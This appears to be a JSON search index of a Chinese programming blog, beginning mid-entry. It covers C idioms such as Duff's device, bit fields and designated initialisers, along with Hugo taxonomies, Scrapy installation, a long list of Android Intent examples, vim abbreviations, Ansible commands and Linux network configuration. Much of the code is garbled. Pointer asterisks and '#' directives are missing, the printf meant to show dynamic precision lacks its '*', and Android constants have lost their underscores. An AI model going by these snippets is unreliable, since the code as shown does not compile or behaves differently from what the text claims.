/\n}\n\n结构体初始化\n\n注意它不是一般意义上的全0初始化，而是逻辑0初始化，这里引用一段stackoverflow上的英文：\n\nmemset/calloc do “all bytes zero” (i.e. physical zeroes), which is indeed not defined for all types. { 0 } is guaranteed to intilaize everything with proper logical zero values. Pointers, for example, are guranteed to get their proper null values, even if the null-value on the given platform is 0xBAADFOOD\n1\n\nstruct mystruct a = {0};\n\nBit fields\n\n很有用的bit定义，尤其是用在某些算法中\n1\n2\n3\n4\n5\n6\n7\n8\n9\n10\n11\n12\n13\n\nstruct cat {\n    unsigned int legs:3;  // 3 bits for legs (0-4 fit in 3 bits)\n    unsigned int lives:4; // 4 bits for lives (0-9 fit in 4 bits)\n    // ...\n};\n\ncat makecat()\n{\n    cat kitty;\n    kitty.legs = 4;\n    kitty.lives = 9;\n    return kitty;\n}\n\n 有限自动机\n\n1\n2\n3\n4\n5\n6\n7\n8\n9\n10\n11\n12\n13\n14\n\nFSM {\n  STATE(x) {\n    ...\n    NEXTSTATE(y);\n  }\n\n  STATE(y) {\n    ...\n    if (x == 0)\n      NEXTSTATE(y);\n    else\n      NEXTSTATE(x);\n  }\n}\n\nthat can be achieved with the following macros:\n1\n2\n3\n\ndefine FSM\ndefine STATE(x)      s##x :\ndefine NEXTSTATE(x)  goto sx\n\nInterlacing structures\n\nInterlacing structures like Duff’s Device:\n1\n2\n3\n4\n5\n6\n7\n8\n9\n10\n11\n12\n13\n14\n15\n16\n17\n\nstrncpy(to, from, count)\nchar to, from;\nint count;\n{\n    int n = (count + 7) / 8;\n    switch (count % 8) {\n    case 0: do { to = from++;\n    case 7:      to = from++;\n    case 6:      to = from++;\n    case 5:      to = from++;\n    case 4:      to = from++;\n    case 3:      to = from++;\n    case 2:      to = from++;\n    case 1:      to = from++;\n               } while (--n \u0026gt; 0);\n    }\n}\n\n数组指定初始化技巧\n\n很好用的技巧，GCC早期已经实现，后合入C99，但其他很多编译器没有实现\n1\n2\n3\n4\n5\n6\n7\n\ndefine FOO 16\ndefine BAR 3\n\nmyStructTypet myStuff[] = {\n    [FOO] = { foo1, foo2, foo3 },\n    [BAR] = { bar1, bar2, bar3 },\n    ...\n\n同上：\n1\n2\n3\n4\n5\n6\n7\n8\n9\n\nstruct foo{\n  int x;\n  int y;\n  char name;\n};\n\nvoid main(){\n  struct foo f = { .y = 23, .name = \"awesome\", .x = -38 };\n}\n\nGCC-参数格式化\n\n1\n2\n\nint myprintf (void myobject, const char myformat, ...)\n            attribute ((format (printf, 2, 3)));\n\n 动态指定浮动打印精度\n\n1\n2\n3\n4\n5\n6\n7\n8\n\ninclude \u0026lt;stdio.h\u0026gt;\n\nint main() {\n    int a = 3;\n    float b = 6.412355;\n    printf(\"%.f\\n\",a,b);\n    return 0;\n}\n\n静态检查\n\n编译时而非运行时\n1\n2\n3\n4\n5\n6\n7\n8\n\n//","tags":null},{"location":"//blog.pytool.com/hugo/hugo_taxonomy","title":"个人博客hugo Taxonomy","text":"---\n\nTaxonomy，即分类，是Hugo中一个很有用的页面管理功能。 本文基于Hyde这个Theme，介绍如何在Hugo中定制、使用Taxonomy。\nHugo中的Taxonomy概念\n\n  Hugo includes support for user-defined groupings of content called taxonomies. Taxonomies are classifications of logical relationships between content.\n\n在官方文档中，简单介绍了Taxonomy的相关概念。 这里有三级概念，见下表。\n\n| 概念       | 翻译   | 解释                           |\n|","tags":null},{"location":"//blog.pytool.com/Post/scrapy/2014-04-23-scrapy-installation","title":"scrapy 安装","text":"原文地址：http://doc.scrapy.org/en/latest/intro/install.html\n准备工作\npython 2.7\n\n        python --version\n\nlxml 安装指南：http://lxml.de/installation.html\n\n        pip install lxml\n\n\t如果报错：\n\n    \tmake sure the development packages of libxml2 and libxslt are installed\n则先执行：apt-get install libxml2-dev libxslt1-dev python-dev 再重新安装\n\nOpenSSL(除了windows，其他系统均已安装)\npip或者easy_install\n\n    \tapt-get install python-pip\n\n安装Scrapy\nNOTE : Don’t use the python-scrapy package provided by Ubuntu, they are typically too old and slow to catch up with latest Scrapy.\n安装方法：http://doc.scrapy.org/en/latest/intro/install.html#intro-install-platform-notes\n\n Import the GPG key used to sign Scrapy packages into APT keyring:\n\n        sudo apt-key adv --keyserver hkp://keyserver.ubuntu.com:80 --recv 627220E7\n\n Create /etc/apt/sources.list.d/scrapy.list file using the following command:\n\n        echo 'deb http://archive.scrapy.org/ubuntu scrapy main' | sudo tee /etc/apt/sources.list.d/scrapy.list\n\n Update package lists and install scrapy-VERSION, replace VERSION by a known Scrapy version (i.e.: scrapy-0.22:\n\n        sudo apt-get update \u0026\u0026 sudo apt-get install scrapy-VERSION","tags":null},{"location":"//blog.pytool.com/Post/Android 应用/2016-01-12 Android应用 Intent实例","title":"Android Activity和Intent机制学习笔记","text":"\nIntent用法实例\n1.无参数Activity跳转\n  Intent it = new Intent(Activity.Main.this, Activity2.class);\n  startActivity(it);   \n2.向下一个Activity传递数据（使用Bundle和Intent.putExtras）\nIntent it = new Intent(Activity.Main.this, Activity2.class);\nBundle bundle=new Bundle();\nbundle.putString(\"name\", \"This is from MainActivity!\");\nit.putExtras(bundle);       // it.putExtra(“test”, \"shuju”);\nstartActivity(it);            // startActivityForResult(it,REQUESTCODE);\n对于数据的获取可以采用：\nBundle bundle=getIntent().getExtras();\nString name=bundle.getString(\"name\");\n\n3.向上一个Activity返回结果（使用setResult，针对startActivityForResult(it,REQUESTCODE)启动的Activity）\n        Intent intent=getIntent();\n        Bundle bundle2=new Bundle();\n        bundle2.putString(\"name\", \"This is from ShowMsg!\");\n        intent.putExtras(bundle2);\n        setResult(RESULTOK, intent);\n4.回调上一个Activity的结果处理函数（onActivityResult）\n@Override\n    protected void onActivityResult(int requestCode, int resultCode, Intent data) {\n        // TODO Auto-generated method stub\n        super.onActivityResult(requestCode, resultCode, data);\n        if (requestCode==REQUESTCODE){\n            if(resultCode==RESULTCANCELED)\n                  setTitle(\"cancle\");\n            else if (resultCode==RESULTOK) {\n                 String temp=null;\n                 Bundle bundle=data.getExtras();\n                 if(bundle!=null)   temp=bundle.getString(\"name\");\n                 setTitle(temp);\n            }\n        }\n    }\n\n★intent大全：\n1.从google搜索内容\nIntent intent = new Intent();\nintent.setAction(Intent.ACTIONWEBSEARCH);\nintent.putExtra(SearchManager.QUERY,\"searchString\")\nstartActivity(intent);\n\n2.浏览网页\nUri uri = Uri.parse(\"http://www.google.com\");\nIntent it  = new Intent(Intent.ACTIONVIEW,uri);\nstartActivity(it);\n\n3.显示地图\nUri uri = Uri.parse(\"geo:38.899533,-77.036476\");\nIntent it = new Intent(Intent.ActionVIEW,uri);\nstartActivity(it);\n\n4.路径规划\nUri uri = Uri.parse(\"http://maps.google.com/maps?f=dsaddr=startLat%20startLng\u0026daddr=endLat%20endLng\u0026hl=en\");\nIntent it = new Intent(Intent.ACTIONVIEW,URI);\nstartActivity(it);\n\n5.拨打电话\nUri uri = Uri.parse(\"tel:xxxxxx\");\nIntent it = new Intent(Intent.ACTIONDIAL, uri);   \nstartActivity(it);\n\n6.调用发短信的程序\nIntent it = new Intent(Intent.ACTIONVIEW);    \nit.putExtra(\"smsbody\", \"The SMS text\");    \nit.setType(\"vnd.android-dir/mms-sms\");    \nstartActivity(it);\n\n7.发送短信\nUri uri = Uri.parse(\"smsto:0800000123\");    \nIntent it = new Intent(Intent.ACTIONSENDTO, uri);    \nit.putExtra(\"smsbody\", \"The SMS text\");    \nstartActivity(it);\nString body=\"this is sms demo\";\nIntent mmsintent = new Intent(Intent.ACTIONSENDTO, Uri.fromParts(\"smsto\", number, null));\nmmsintent.putExtra(Messaging.KEYACTIONSENDTOMESSAGEBODY, body);\nmmsintent.putExtra(Messaging.KEYACTIONSENDTOCOMPOSEMODE, true);\nmmsintent.putExtra(Messaging.KEYACTIONSENDTOEXITONSENT, true);\nstartActivity(mmsintent);\n\n8.发送彩信\nUri uri = Uri.parse(\"content://media/external/images/media/23\");    \nIntent it = new Intent(Intent.ACTIONSEND);    \nit.putExtra(\"smsbody\", \"some text\");    \nit.putExtra(Intent.EXTRASTREAM, uri);    \nit.setType(\"image/png\");    \nstartActivity(it);\nStringBuilder sb = new StringBuilder();\nsb.append(\"file://\");\nsb.append(fd.getAbsoluteFile());\nIntent intent = new Intent(Intent.ACTIONSENDTO, Uri.fromParts(\"mmsto\", number, null));\n// Below extra datas are all optional.\nintent.putExtra(Messaging.KEYACTIONSENDTOMESSAGESUBJECT, subject);\nintent.putExtra(Messaging.KEYACTIONSENDTOMESSAGEBODY, body);\nintent.putExtra(Messaging.KEYACTIONSENDTOCONTENTURI, sb.toString());\nintent.putExtra(Messaging.KEYACTIONSENDTOCOMPOSEMODE, composeMode);\nintent.putExtra(Messaging.KEYACTIONSENDTOEXITONSENT, exitOnSent);\nstartActivity(intent);\n\n9.发送Email\nUri uri = Uri.parse(\"mailto:xxx@abc.com\");\nIntent it = new Intent(Intent.ACTIONSENDTO, uri);\nstartActivity(it);\nIntent it = new Intent(Intent.ACTIONSEND);    \nit.putExtra(Intent.EXTRAEMAIL, \"me@abc.com\");    \nit.putExtra(Intent.EXTRATEXT, \"The email body text\");    \nit.setType(\"text/plain\");    \nstartActivity(Intent.createChooser(it, \"Choose Email Client\"));\nIntent it=new Intent(Intent.ACTIONSEND);      \nString[] tos={\"me@abc.com\"};      \nString[] ccs={\"you@abc.com\"};      \nit.putExtra(Intent.EXTRAEMAIL, tos);      \nit.putExtra(Intent.EXTRACC, ccs);      \nit.putExtra(Intent.EXTRATEXT, \"The email body text\");      \nit.putExtra(Intent.EXTRASUBJECT, \"The email subject text\");      \nit.setType(\"message/rfc822\");      \nstartActivity(Intent.createChooser(it, \"Choose Email Client\"));    \n\nIntent it = new Intent(Intent.ACTIONSEND);    \nit.putExtra(Intent.EXTRASUBJECT, \"The email subject text\");    \nit.putExtra(Intent.EXTRASTREAM, \"file:///sdcard/mysong.mp3\");    \nsendIntent.setType(\"audio/mp3\");    \nstartActivity(Intent.createChooser(it, \"Choose Email Client\"));\n\n10.播放多媒体   \nIntent it = new Intent(Intent.ACTIONVIEW);\nUri uri = Uri.parse(\"file:///sdcard/song.mp3\");\nit.setDataAndType(uri, \"audio/mp3\");\nstartActivity(it);\nUri uri = Uri.withAppendedPath(MediaStore.Audio.Media.INTERNALCONTENTURI, \"1\");    \nIntent it = new Intent(Intent.ACTIONVIEW, uri);    \nstartActivity(it);\n\n11.uninstall apk\nUri uri = Uri.fromParts(\"package\", strPackageName, null);    \nIntent it = new Intent(Intent.ACTIONDELETE, uri);    \nstartActivity(it);\n\n12.install apk\nUri installUri = Uri.fromParts(\"package\", \"xxx\", null);\nreturnIt = new Intent(Intent.ACTIONPACKAGEADDED, installUri);\n\n13. 打开照相机\n    1Intent i = new Intent(Intent.ACTIONCAMERABUTTON, null);\n           this.sendBroadcast(i);\n     2long dateTaken = System.currentTimeMillis();\n            String name = createName(dateTaken) + \".jpg\";\n            fileName = folder + name;\n            ContentValues values = new ContentValues();\n            values.put(Images.Media.TITLE, fileName);\n            values.put(\"data\", fileName);\n            values.put(Images.Media.PICASAID, fileName);\n            values.put(Images.Media.DISPLAYNAME, fileName);\n            values.put(Images.Media.DESCRIPTION, fileName);\n            values.put(Images.ImageColumns.BUCKETDISPLAYNAME, fileName);\n            Uri photoUri = getContentResolver().insert(\n                    MediaStore.Images.Media.EXTERNALCONTENTURI, values);\n\n            Intent inttPhoto = new Intent(MediaStore.ACTIONIMAGECAPTURE);\n            inttPhoto.putExtra(MediaStore.EXTRAOUTPUT, photoUri);\n            startActivityForResult(inttPhoto, 10);\n14.从gallery选取图片\n  Intent i = new Intent();\n            i.setType(\"image/\");\n            i.setAction(Intent.ACTIONGETCONTENT);\n            startActivityForResult(i, 11);\n15. 打开录音机\n   Intent mi = new Intent(Media.RECORDSOUNDACTION);\n            startActivity(mi);\n\n16.显示应用详细列表       \nUri uri = Uri.parse(\"market://details?id=appid\");         \nIntent it = new Intent(Intent.ACTIONVIEW, uri);         \nstartActivity(it);         \n//where appid is the application ID, find the ID          \n//by clicking on your application on Market home          \n//page, and notice the ID from the address bar      \n\n刚才找app id未果，结果发现用package name也可以\nUri uri = Uri.parse(\"market://details?id=packagename\");\n这个简单多了\n\n17寻找应用       \nUri uri = Uri.parse(\"market://search?q=pname:pkgname\");         \nIntent it = new Intent(Intent.ACTIONVIEW, uri);         \nstartActivity(it);\n//where pkgname is the full package path for an application       \n\n18打开联系人列表\n            1            \n           Intent i = new Intent();\n           i.setAction(Intent.ACTIONGETCONTENT);\n           i.setType(\"vnd.android.cursor.item/phone\");\n           startActivityForResult(i, REQUESTTEXT);\n\n            2\n            Uri uri = Uri.parse(\"content://contacts/people\");\n            Intent it = new Intent(Intent.ACTIONPICK, uri);\n            startActivityForResult(it, REQUESTTEXT);\n\n19 打开另一程序\nIntent i = new Intent();\n            ComponentName cn = new ComponentName(\"com.yellowbook.android2\",\n                    \"com.yellowbook.android2.AndroidSearch\");\n            i.setComponent(cn);\n            i.setAction(\"android.intent.action.MAIN\");\n            startActivityForResult(i, RESULTOK);\n\n20.调用系统编辑添加联系人（高版本SDK有效）：\nIntent it = newIntent(Intent.ACTIONINSERTOREDIT);\n               it.setType(\"vnd.android.cursor.item/contact\");\n                //it.setType(Contacts.CONTENTITEMTYPE);\n                it.putExtra(\"name\",\"myName\");\n               it.putExtra(android.provider.Contacts.Intents.Insert.COMPANY,  \"organization\");\n               it.putExtra(android.provider.Contacts.Intents.Insert.EMAIL,\"email\");\n                it.putExtra(android.provider.Contacts.Intents.Insert.PHONE,\"homePhone\");\n                it.putExtra(android.provider.Contacts.Intents.Insert.SECONDARYPHONE,\n                               \"mobilePhone\");\n                it.putExtra(  android.provider.Contacts.Intents.Insert.TERTIARYPHONE,\n                               \"workPhone\");\n               it.putExtra(android.provider.Contacts.Intents.Insert.JOBTITLE,\"title\");\n                startActivity(it);\n\n21.调用系统编辑添加联系人（全有效）：\nIntent intent = newIntent(Intent.ACTIONINSERTOREDIT);\n           intent.setType(People.CONTENTITEMTYPE);\n           intent.putExtra(Contacts.Intents.Insert.NAME, \"My Name\");\n           intent.putExtra(Contacts.Intents.Insert.PHONE, \"+1234567890\");\n           intent.putExtra(Contacts.Intents.Insert.PHONETYPE,Contacts.PhonesColumns.TYPEMOBILE);\n           intent.putExtra(Contacts.Intents.Insert.EMAIL, \"com@com.com\");\n           intent.putExtra(Contacts.Intents.Insert.EMAILTYPE,                    Contacts.ContactMethodsColumns.TYPEWORK);\n           startActivity(intent);\n           ***\n下面是转载来的其他的一些Intent用法实例（转自javaeye）\n\n显示网页\n   Uri uri = Uri.parse(\"http://google.com\");\n   Intent it = new Intent(Intent.ACTIONVIEW, uri);\n   startActivity(it);\n\n显示地图\n   Uri uri = Uri.parse(\"geo:38.899533,-77.036476\");\n   Intent it = new Intent(Intent.ACTIONVIEW, uri);  \n   startActivity(it);  \n   //其他 geo URI 範例\n   //geo:latitude,longitude\n   //geo:latitude,longitude?z=zoom\n   //geo:0,0?q=my+street+address\n   //geo:0,0?q=business+near+city\n   //google.streetview:cbll=lat,lng\u0026cbp=1,yaw,,pitch,zoom\u0026mz=mapZoom\n\n路径规划\n   Uri uri = Uri.parse(\"http://maps.google.com/maps?f=d\u0026saddr=startLat%20startLng\u0026daddr=endLat%20endLng\u0026hl=en\");\n   Intent it = new Intent(Intent.ACTIONVIEW, uri);\n   startActivity(it);\n   //where startLat, startLng, endLat, endLng are a long with 6 decimals like: 50.123456\n\n打电话\n   //叫出拨号程序\n   Uri uri = Uri.parse(\"tel:0800000123\");\n   Intent it = new Intent(Intent.ACTIONDIAL, uri);\n   startActivity(it);\n   //直接打电话出去\n   Uri uri = Uri.parse(\"tel:0800000123\");\n   Intent it = new Intent(Intent.ACTIONCALL, uri);\n   startActivity(it);\n   //用這個，要在 AndroidManifest.xml 中，加上\n   //uses-permission id=\"android.permission.CALLPHONE\" /\n\n传送SMS/MMS\n   //调用短信程序\n   Intent it = new Intent(Intent.ACTIONVIEW, uri);\n   it.putExtra(\"smsbody\", \"The SMS text\");  \n   it.setType(\"vnd.android-dir/mms-sms\");\n   startActivity(it);\n   //传送消息\n   Uri uri = Uri.parse(\"smsto://0800000123\");\n   Intent it = new Intent(Intent.ACTIONSENDTO, uri);\n   it.putExtra(\"smsbody\", \"The SMS text\");\n   startActivity(it);\n   //传送 MMS\n   Uri uri = Uri.parse(\"content://media/external/images/media/23\");\n   Intent it = new Intent(Intent.ACTIONSEND);  \n   it.putExtra(\"smsbody\", \"some text\");  \n   it.putExtra(Intent.EXTRASTREAM, uri);\n   it.setType(\"image/png\");  \n   startActivity(it);\n\n传送 Email\n   Uri uri = Uri.parse(\"mailto:xxx@abc.com\");\n   Intent it = new Intent(Intent.ACTIONSENDTO, uri);\n   startActivity(it);\n\n   Intent it = new Intent(Intent.ACTIONSEND);\n   it.putExtra(Intent.EXTRAEMAIL, \"me@abc.com\");\n   it.putExtra(Intent.EXTRATEXT, \"The email body text\");\n   it.setType(\"text/plain\");\n   startActivity(Intent.createChooser(it, \"Choose Email Client\"));\n\n   Intent it=new Intent(Intent.ACTIONSEND);   \n   String[] tos={\"me@abc.com\"};   \n   String[] ccs={\"you@abc.com\"};   \n   it.putExtra(Intent.EXTRAEMAIL, tos);   \n   it.putExtra(Intent.EXTRACC, ccs);   \n   it.putExtra(Intent.EXTRATEXT, \"The email body text\");   \n   it.putExtra(Intent.EXTRASUBJECT, \"The email subject text\");   \n   it.setType(\"message/rfc822\");   \n   startActivity(Intent.createChooser(it, \"Choose Email Client\"));\n\n   //传送附件\n   Intent it = new Intent(Intent.ACTIONSEND);\n   it.putExtra(Intent.EXTRASUBJECT, \"The email subject text\");\n   it.putExtra(Intent.EXTRASTREAM, \"file:///sdcard/mysong.mp3\");\n   sendIntent.setType(\"audio/mp3\");\n   startActivity(Intent.createChooser(it, \"Choose Email Client\"));\n\n播放多媒体\n       Uri uri = Uri.parse(\"file:///sdcard/song.mp3\");\n       Intent it = new Intent(Intent.ACTIONVIEW, uri);\n       it.setType(\"audio/mp3\");\n       startActivity(it);\n       Uri uri = Uri.withAppendedPath(MediaStore.Audio.Media.INTERNALCONTENTURI, \"1\");\n       Intent it = new Intent(Intent.ACTIONVIEW, uri);\n       startActivity(it);\n\nMarket 相关\n//寻找某个应用\nUri uri = Uri.parse(\"market://search?q=pname:pkgname\");\nIntent it = new Intent(Intent.ACTIONVIEW, uri);\nstartActivity(it);\n//where pkgname is the full package path for an application\n//显示某个应用的相关信息\nUri uri = Uri.parse(\"market://details?id=appid\");\nIntent it = new Intent(Intent.ACTIONVIEW, uri);\nstartActivity(it);\n//where appid is the application ID, find the ID  \n//by clicking on your application on Market home  \n//page, and notice the ID from the address bar\n\nUninstall 应用程序\n        Uri uri = Uri.fromParts(\"package\", strPackageName, null);\n        Intent it = new Intent(Intent.ACTIONDELETE, uri);  \n       startActivity(it);\n一 Android系统用于Activity的标准Intent\n1 根据联系人ID显示联系人信息\n    Intent intent = new Intent();  \n    intent.setAction(Intent.ACTIONVIEW);   //显示联系人信息  \n    intent.setData(Uri.parse(\"content://contacts/people/492\"));  \n    startActivity(intent);  \n2 根据联系人ID显示拨号面板  \n    Intent intent = new Intent();  \n    intent.setAction(Intent.ACTIONDIAL);  //显示拨号面板  \n    intent.setData(Uri.parse(\"content://contacts/people/492\"));  \n    startActivity(intent);    \n3 显示拨号面板， 并在拨号面板上将号码显示出来  \n    Intent intent = new Intent();  \n    intent.setAction(Intent.ACTIONVIEW);     \n    intent.setData(Uri.parse(\"tel://15216448315\"));  \n    startActivity(intent);    \n4 显示拨号面板， 并在拨号面板上将号码显示出来  \n    Intent intent = new Intent();  \n    intent.setAction(Intent.ACTIONDIAL);   //显示拨号面板, 并在拨号面板上将号码显示出来  \n    intent.setData(Uri.parse(\"tel://15216448315\"));  \n    startActivity(intent);    \n5 根据联系人的ID编辑联系人  \n    Intent intent = new Intent();  \n    intent.setAction(Intent.ACTIONEDIT);   //编辑联系人  \n    intent.setData(Uri.parse(\"content://contacts/people/492\"));  \n    startActivity(intent);    \n6 显示通讯录联系人和其他账号联系人的列表  \n    Intent intent = new Intent();  \n    intent.setAction(Intent.ACTIONVIEW);     \n    intent.setData(Uri.parse(\"content://contacts/people/\"));  \n    startActivity(intent);    \n7 启动HomeScreen  \n    Intent intent = new Intent();  \n    intent.setAction(Intent.ACTIONMAIN);     //启动HomeScreen  \n    intent.addCategory(Intent.CATEGORYHOME);  \n    startActivity(intent);    \n8 选择某个联系人的号码，返回一个代表这个号码的uri，如:content://contacts/phones/982  \n    Intent intent = new Intent();  \n    intent.setAction(Intent.ACTIONGETCONTENT);       \n    intent.setType(\"vnd.android.cursor.item/phone\");  \n    startActivityForResult(intent, 1);    \n9  打开多个应用选取各种类型的数据,以uri返回。返回的uri可使用ContentResolver.openInputStream(Uri)打开\n    该功能可用在邮件中附件的选取\n    举例如下:\n    选取一张图片, 返回的uri为 content://media/external/images/media/47\n    选取一首歌, 返回的uri为 content://media/external/audio/media/51  \n    Intent intent = new Intent();  \n    intent.setAction(Intent.ACTIONGETCONTENT);       \n    intent.setType(\"/\");  \n    intent.addCategory(Intent.CATEGORYOPENABLE);  \n    startActivityForResult(intent, 2);   \n10 自定义一个chooser，不使用系统的chooser\n     该chooser可以有自己的标题(Title)\n     并且不必让用户指定偏好  \n     Intent intent = new Intent();  \n    intent.setAction(Intent.ACTIONCHOOSER);   \n    intent.putExtra(Intent.EXTRATITLE, \"my chooser\");  \n    intent.putExtra(Intent.EXTRAINTENT,   \n            new Intent(Intent.ACTIONGETCONTENT)  \n            .setType(\"/\")  \n            .addCategory(Intent.CATEGORYOPENABLE)  \n            );  \n    startActivityForResult(intent, 2);    \n11 选取activity，返回的activity可在返回的intent.getComponent()中得到  \n    Intent intent = new Intent();  \n    intent.setAction(Intent.ACTIONPICKACTIVITY);   \n    intent.putExtra( Intent.EXTRAINTENT,   \n            new Intent(Intent.ACTIONGETCONTENT)  \n            .setType(\"/*\")  \n            .addCategory(Intent.CATEGORYOPENABLE)  \n            );  \n    startActivityForResult(intent, 3);    \n12 启动搜索，在以下示例代码中，\"ANDROID\"为要搜索的字符串\n     当执行这段代码后, 会在系统的Chooser中显示可以用于搜索的程序列表  \n     Intent intent = new Intent();  \n    intent.setAction(Intent.ACTIONSEARCH);     //启动搜索  \n    intent.putExtra(SearchManager.QUERY, \"ANDROID\");  \n    startActivity(intent);    \n13 启动WEB搜索，在以下示例代码中，\"ANDROID\"为要搜索的字符串\n     当执行这段代码后, 会在系统的Chooser中显示可以用于搜索的程序列表，一般情况下系统中安装的浏览器都会显示出来  \n     Intent intent = new Intent();  \n    intent.setAction(Intent.ACTIONWEBSEARCH);     //启动搜索  \n    intent.putExtra(SearchManager.QUERY, \"ANDROID\");  \n    startActivity(intent);    \n 二  Android系统用于BroadcastReceiver的标准Intent\n1 ACTIONTIMETICK，系统时钟广播，系统每分钟都会发送一个这样的广播，\n   如果在应用开发中，有些逻辑依赖于系统时钟，可以注册一个广播接收者\n   这是一个受保护的action，只有系统才能发送这个广播\n   并且，在manifest文件中注册的广播接收者不能接收到该广播，若要接收该广播，必须在代码中注册广播接收者  \n    registerReceiver(new BroadcastReceiver(){  \n        @Override  \n        public void onReceive(Context context, Intent intent) {  \n            Log.i(\"xxxx\", \"TIMETICK\");  \n        }  \n    },   \n    new IntentFilter(Intent.ACTIONTIMETICK));    \n2 在官方文档中，列出了以下标准的广播action  \n    ACTIONTIMETICK               系统时钟广播\n    ACTIONTIMECHANGED            时间被重新设置\n    ACTIONTIMEZONECHANGED        时区改变\n    ACTIONBOOTCOMPLETED          系统启动完成\n    ACTIONPACKAGEADDED           系统中安装了新的应用\n    ACTIONPACKAGECHANGED         系统中已存在的app包被更改\n    ACTIONPACKAGEREMOVED         系统中已存在的app被移除\n    ACTIONPACKAGERESTARTED       用户重启了一个app，这个app的所有进程被杀死\n    ACTIONPACKAGEDATACLEARED    用户清除了一个app的数据\n    ACTIONUIDREMOVED             系统中的一个user ID被移除\n    ACTIONBATTERYCHANGED         电池状态改变，这是一个sticky广播\n    ACTIONPOWERCONNECTED         设备连接了外部电源\n    ACTIONPOWERDISCONNECTED      外部电源被移除\n    ACTIONSHUTDOWN                设备正在关机  \n三  Android中的标准类别（category）\n类别（category）一般配合action使用，以下为系统中的标准类别，由于数量过多，只能在使用到时再详细研究  \n    CATEGORYDEFAULT\n    CATEGORYBROWSABLE\n    CATEGORYTAB\n    CATEGORYALTERNATIVE\n    CATEGORYSELECTEDALTERNATIVE\n    CATEGORYLAUNCHER\n    CATEGORYINFO\n    CATEGORYHOME\n    CATEGORYPREFERENCE\n    CATEGORYTEST\n    CATEGORYCARDOCK\n    CATEGORYDESKDOCK\n    CATEGORYLEDESKDOCK\n    CATEGORYHEDESKDOCK\n    CATEGORYCARMODE\n    CATEGORYAPPMARKET  \n 四  Android中的标准Extra键值\n这些常量用于在调用Intent.putExtra(String, Bundle)时作为键值传递数据，同样由于数量较多，在此只列出索引  \n    EXTRAALARMCOUNT\n    EXTRABCC\n    EXTRACC\n    EXTRACHANGEDCOMPONENTNAME\n    EXTRADATAREMOVED\n    EXTRADOCKSTATE\n    EXTRADOCKSTATEHEDESK\n    EXTRADOCKSTATELEDESK\n    EXTRADOCKSTATECAR\n    EXTRADOCKSTATEDESK\n    EXTRADOCKSTATEUNDOCKED\n    EXTRADONTKILLAPP\n    EXTRAEMAIL\n    EXTRAINITIALINTENTS\n    EXTRAINTENT\n    EXTRAKEYEVENT\n    EXTRAORIGINATINGURI\n    EXTRAPHONENUMBER\n    EXTRAREFERRER\n    EXTRAREMOTEINTENTTOKEN\n    EXTRAREPLACING\n    EXTRASHORTCUTICON\n    EXTRASHORTCUTICONRESOURCE\n    EXTRASHORTCUTINTENT\n    EXTRASTREAM\n    EXTRASHORTCUTNAME\n    EXTRASUBJECT\n    EXTRATEMPLATE\n    EXTRATEXT\n    EXTRATITLE\n    EXTRAUID  \n五  Intent中的标志（FLAG）\nIntent类中定义了一些以FLAG开头的标志位，这些标志位中有的非常重要，会影响app中Activity和BroadcastReceiver等的行为。\n以下为这些标志位的索引，是从官方文档上的截图。之后会对重要的标志加以详细分析\n Android开发——Intent中的各种FLAG ","tags":null},{"location":"//blog.pytool.com/Post/Go/golang语言包用法/sync_channel","title":"golang中并发sync和channel","text":"---\nchenbaoke的专栏","tags":null},{"location":"//blog.pytool.com/Edit/vim 缩写abbreviation","title":"vim abbreviation","text":"Vim有一句哲学是这样说的：“if you write a thing once,it it okay,However,if you're writing it twice or more times,then you should find a better way to do it\"。这句话估计也是引用软件开发里面的DRP（Don't Repeat Yourself）原则。如果你老是需要重复的写一些相同的东西，此时你就应该使用abbreviation（缩写）.\n\n :abbreviate 作用于所有模式   （ab）\n :iabbrev    仅作用于插入模式 （iab）\n :cabbrev    仅作用于命令行模式（cab）\n\nabbreviation可以用在很多有意思的地方，比如：\n\n    纠正错误的拼写::iabbr teh the\n    程序中你能想到的模版语句：:iabbr forx for(x=0;x100;x++){","tags":null},{"location":"//blog.pytool.com/Post/ansible/2016-01-02 Linux命令 ansible组件","title":"Linux命令 Ansible组件","text":"Tower替代软件\n docker run -d --name=semaphore -p 80:3000 -v /docker/ansible/semaphore:/data playniuniu/ansible-semaphore\n!/bin/sh\nSEMAPHOREDBHOST=\"127.0.0.1\"\nSEMAPHOREDBPORT=\"3306\"\nSEMAPHOREDBUSER=\"root\"\nSEMAPHOREDBPASS=\"root\"\nSEMAPHOREDB=\"semaphore\"\nSEMAPHOREPLAYBOOKPATH=\"/data/\"\nSEMAPHOREADMIN=\"root\"\nSEMAPHOREADMINEMAIL=\"root@example.com\"\nSEMAPHOREADMINNAME=\"root\"\nSEMAPHOREADMINPASSWORD=\"root\"\n\nsomehost         ansiblesshport=2222     ansiblesshuser=manager\n\n pamlimits\nansible all -m shell -a \"ulimit -HSn 65535\"\nansible all -m pamlimits -a \"domain= limittype=- limititem=nofile value=65536\"\nansible all -m pamlimits -a \"domain= limittype=hard limititem=nofile value=65536\"\n\n时间同步chrony\n ansible-galaxy install influxdata.chrony\n\n mariadb 集群\nansible-galaxy install mrlesmithjr.mariadb-galera-cluster mrlesmithjr.etc-hosts\n/etc/ansible/roles/mrlesmithjr.mariadb-galera-cluster","tags":null},{"location":"//blog.pytool.com/Hacker/00_nettools/2016-01-01 Linux命令 Iproute","title":"Linux命令 Iproute2","text":"---\n\n/etc/hosts：域名到 IP 地址的映射。\n/etc/networks：网络名称到 IP 地址的映射。\n/etc/protocols：协议名称到协议编号的映射。\n/etc/services：TCP/UDP 服务名称到端口号的映射。\n\n1. DNS 域名-  IP vi /etc/resolv.conf\nsudo gedit /etc/resolvconf/resolv.conf.d/base\nnameserver 114.114.114.114\nnameserver 114.114.115.115\nsudo /etc/init.d/resolvconf restart  \nnameserver 127.0.1.1\nsearch DHCP HOST\n 2. IP-  主机名的映射 /etc/hosts\n127.0.0.1 localhost\n127.0.1.1 ubuntu-server\n10.0.0.11 server1.example.com server1 vpn\n10.0.0.12 server2.example.com server2 mail\n10.0.0.13 server3.example.com server3 www\n10.0.0.14 server4.example.com server4 file\n3. ip配置:/etc/network/interfaces\nDHCP\nauto eth0\niface eth0 inet dhcp\nSTATIC\nauto eth0\niface eth0 inet static\naddress 10.0.0.100\nnetmask 255.255.255.0\ngateway 10.0.0.1\nLoopback\nauto lo\niface lo inet loopback\n 3. 网桥配置 /etc/network/interfaces\n\n使用 DHCP\nauto br0\niface br0 inet dhcp\n        bridgeports eth0\n        bridgestp off\n        bridgefd 0\n        bridgemaxwait 0\n 设置 eth0 并将它映射到 br0\nauto br0\niface br0 inet static\n      address 10.18.44.26\n      netmask 255.255.255.192\n      broadcast 